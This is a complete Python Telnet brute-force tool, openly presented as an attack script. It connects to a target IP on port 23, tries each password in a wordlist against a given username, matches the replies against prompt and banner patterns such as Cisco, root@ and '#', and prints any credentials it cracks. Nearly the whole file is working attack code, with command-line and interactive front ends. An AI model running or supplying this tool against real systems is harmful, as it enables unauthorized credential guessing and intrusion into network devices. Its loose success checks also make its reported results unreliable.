#!/usr/bin/env python3
# Telnet Brute Force

import argparse
import socket
import sys
import signal
import time
import threading

RED = "\033[38;2;255;0;0m"
RESET = "\033[0m"
BOLD = "\033[1m"

DEFAULT_PORT = 23
SUCCESS_BANNER_TEMPLATE = "Login the CLI by {}"

stopTimer = False
progressLine = ""
timerThread = None
stdoutLock = threading.Lock()

# Common success patterns for various devices
SUCCESS_PATTERNS = [
    "Login successful",
    "User Access Verification",
    "Press Enter to continue",
    "Welcome to the CLI",
    "Switch>",  # Cisco switches
    "Router>",  # Cisco routers
    "hostname>",  # Generic device prompt
    ">",  # Generic prompt
    "#",  # Some devices use a root-level prompt
    "login:",  # Some devices print "login:" after successful auth
    "Password:",  # In case there's another password prompt
    "CLI>",  # Common CLI prompt for various devices
    "User:",  # Generic user prompt
    "Login the CLI by",  # Your success banner
    "Welcome to your system",  # Generic success banner
    "Network Access Login",  # Generic networking devices
    "Enter the system",  # Some Unix/Linux-like systems
    "admin@",  # Some Unix/Linux prompt
    "root@",  # Some Unix/Linux prompt
    "Access granted",  # Generic message
    "Success",  # Very generic
    "Session started",  # Some systems use this
    ">>>",  # Python interactive shell prompt
    ">",  # Many switches and routers have a '>' prompt
]

def UpdateTimer(startTime):
    while not stopTimer:
        elapsed = time.time() - startTime
        elapsedFmt = time.strftime("%H:%M:%S", time.gmtime(elapsed))
        with stdoutLock:
            # clear and rewrite the progress line
            sys.stdout.write("\r\033[K" + progressLine + "\n")
            # write duration on the next line (no clearing)
            sys.stdout.write(f"Duration: {BOLD}{elapsedFmt}{RESET}")
            # move cursor back up so next progress update overwrites correctly
            sys.stdout.write("\033[F")
            sys.stdout.flush()
        time.sleep(1)

def TelnetBruteForce(host, port, username, passwords):
    global stopTimer, progressLine, timerThread

    successBanner = SUCCESS_BANNER_TEMPLATE.format(username)
    total = len(passwords)
    attempts = 0

    print(f"{RED}\n[*] Starting brute force: {username}@{host}:{port} ({total} passwords){RESET}")
    startTime = time.time()

    progressLine = f"Attempts: {BOLD}0/{total}{RESET} | Last: {BOLD}---{RESET}"
    stopTimer = False
    timerThread = threading.Thread(target=UpdateTimer, args=(startTime,))
    timerThread.start()

    for pwd in passwords:
        attempts += 1
        progressLine = f"Attempts: {BOLD}{attempts}/{total}{RESET} | Last: {BOLD}{pwd}{RESET}"
        with stdoutLock:
            sys.stdout.write("\r\033[K" + progressLine)
            sys.stdout.flush()

        if TryPassword(host, port, username, pwd, successBanner):
            print(f"\n\n{RED}[+] SUCCESS:{RESET} \n{RED}Username: {RESET}{BOLD}{username}{RESET}\n{RED}Password: {RESET}{BOLD}{pwd}{RESET}")
            stopTimer = True
            timerThread.join()
            return

    stopTimer = True
    timerThread.join()
    print(f"\n\n{RED}[-] No valid password found.{RESET}")

def TryPassword(host, port, username, password, successBanner):
    try:
        sock = socket.socket()
        sock.settimeout(5)
        sock.connect((host, port))

        # Send username
        sock.send((username + "\r\n").encode())
        data = sock.recv(1024).decode(errors="ignore")
        
        # Wait for Password prompt
        if "Password:" not in data:
            return False

        # Send password
        sock.send((password + "\r\n").encode())
        data = sock.recv(1024).decode(errors="ignore")
        
        # Check if any of the success patterns are in the response
        for pattern in SUCCESS_PATTERNS:
            if pattern in data:
                return True
        
        return False

    except Exception as e:
        print(f"[!] Error during password attempt: {e}")
        return False
    finally:
        try:
            sock.close()
        except: pass

def LoadPasswords(path):
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{RED}[!] Wordlist not found: {path}{RESET}")
        sys.exit(1)

def menu():
    host = input(f"\n{RED}Target IP: {RESET}").strip()
    username = input(f"{RED}Username: {RESET}").strip()
    wordlist = input(f"{RED}Wordlist [default: passwords.txt]: {RESET}").strip() or "passwords.txt"
    passwords = LoadPasswords(wordlist)
    TelnetBruteForce(host, DEFAULT_PORT, username, passwords)

def terminal():
    parser = argparse.ArgumentParser(
        description="Telnet Brute Force Tool",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-u", "--username", required=True, help="Username to brute")
    parser.add_argument("-w", "--wordlist", default="passwords.txt",
                        help="Path to wordlist (default: passwords.txt)")
    parser.add_argument("-p", "--port", type=int, default=DEFAULT_PORT,
                        help=f"Telnet port (default: {DEFAULT_PORT})")
    args = parser.parse_args()
    passwords = LoadPasswords(args.wordlist)
    TelnetBruteForce(args.target, args.port, args.username, passwords)

def SignalHandler(sig, frame):
    global stopTimer, timerThread
    print(f"\n{RED}Stopping the attack...{RESET}")
    stopTimer = True
    if timerThread and timerThread.is_alive():
        timerThread.join()
    sys.exit(0)

def main():
    signal.signal(signal.SIGINT, SignalHandler)
    if len(sys.argv) > 1:
        terminal()
    else:
        menu()

if __name__ == "__main__":
    main()
